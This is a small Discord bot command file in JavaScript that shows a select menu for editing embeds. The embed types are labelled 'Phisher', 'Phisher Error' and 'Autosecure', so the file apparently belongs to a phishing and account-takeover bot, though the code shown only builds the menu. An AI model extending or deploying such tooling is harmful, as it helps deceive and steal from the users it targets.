const { ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder } = require("discord.js");
const getbotnumber = require("../../../db/getbotnumber");

module.exports = {
    name: "editembeds",
    editembeds: true,
    callback: async (client, interaction) => {
        let botnumber = await getbotnumber(interaction, client, 1, "editembeds");
        const embedSelector = new StringSelectMenuBuilder()
            .setCustomId(`embeds|${botnumber}`)
            .setPlaceholder('Select the type of embed to edit!')
            .addOptions([
                {
                    label: 'Phisher Embeds',
                    description: 'Edit phisher related embeds',
                    value: 'phisher',
                },
                {
                    label: 'Phisher Error',
                    description: 'Edit phisher error embeds',
                    value: 'error',
                },
                {
                    label: 'Autosecure Embeds',
                    description: 'Edit autosecure embeds',
                    value: 'autosecure',
                }
            ]);

        const row = new ActionRowBuilder()
            .addComponents(embedSelector);

        return interaction.reply({
            embeds: [{
                title: `Select which type of embeds to edit!`,
                color: 0xC8C8C8
            }],
            components: [row],
            ephemeral: true
        });
    }
}